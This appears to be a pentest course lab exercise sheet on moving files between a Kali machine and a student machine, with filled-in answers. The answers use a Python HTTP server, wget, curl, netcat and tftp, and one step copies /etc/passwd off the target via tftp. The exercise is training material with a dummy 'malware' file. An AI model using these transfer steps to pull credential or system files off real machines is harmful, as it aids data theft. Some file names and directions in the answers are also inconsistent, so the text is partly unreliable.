[Summary](./README.md)

## Exercises

1. On your Kali machine, create a file named malware.php.

````  
echo "This is a malware file" > malware.php 
````
Then, in the same directory, ccreate a temporary server with python on port 5000.
````
python3 -m http.server 5000
````
2. On your Student machine, download the malware.txt file with the wget command.

> Your command : wget 192.168.149.15:5000/malware.php

3. On your Student machine, download the malware.txt file with the cURL command.

> Your command : curl -O 192.168.149.15:5000/malware.php

4. On the student machine, create a file named password.txt and transfer it to your student machine with netcat

> Your commands : nc -lvp 4444 < password.txt
> nc 10.12.181.103 4444 > password.txt

5. On the student machine, transfer ``/etc/passwd`` file to your kali machine with tftp

> the default folder where files are shared on the student machine is /var/lib/tftpboot so I copied passwd in there as root user first

> your commands : tftp 10.12.181.103
> get passwd

[Next](./Privilege_Escalation.md)